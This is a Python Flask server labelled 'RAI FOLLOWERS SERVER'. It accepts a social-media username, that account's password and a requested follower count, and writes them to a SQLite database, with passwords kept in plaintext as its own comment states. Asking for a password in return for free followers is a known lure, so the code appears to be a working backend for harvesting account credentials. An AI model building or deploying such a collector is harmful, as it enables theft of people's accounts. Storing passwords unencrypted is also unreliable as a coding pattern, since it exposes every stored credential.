from flask import Flask, send_from_directory, request, jsonify
import sqlite3
from datetime import datetime
app = Flask(__name__)
DB = "requests.db"

def init_db():
    conn = sqlite3.connect(DB)

    # Add a password column to the requests table
    conn.execute("""
        CREATE TABLE IF NOT EXISTS requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            followers INTEGER NOT NULL,
            time TEXT NOT NULL,
            status TEXT NOT NULL
        )
    """)

    conn.commit()
    conn.close()

@app.route("/")
def home():
    return send_from_directory(".", "index.html")

@app.route("/request", methods=["POST"])
def save_request():

    data = request.get_json()

    username = data.get("username", "").strip().lstrip("@")
    password = data.get("password", "").strip()
    followers = data.get("followers")

    if not username or not password or not followers:
        return jsonify({
            "success": False,
            "error": "Username, password or followers missing"
        }), 400

    try:
        followers = int(followers)
    except ValueError:
        return jsonify({
            "success": False,
            "error": "Invalid followers amount"
        }), 400

    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    conn = sqlite3.connect(DB)

    conn.execute(
        """
        INSERT INTO requests
        (username, password, followers, time, status)
        VALUES (?, ?, ?, ?, ?)
        """,
        (username, password, followers, time_now, "Pending")  # Storing password in plaintext
    )

    conn.commit()
    conn.close()

    return jsonify({
        "success": True,
        "message": "Request saved"
    })

if __name__ == "__main__":
    init_db()

    print("🚀 RAI FOLLOWERS SERVER STARTED")
    print("🌐 Open: http://127.0.0.1:8080")

    app.run(
        host="0.0.0.0",
        port=8080,
        debug=False
    )
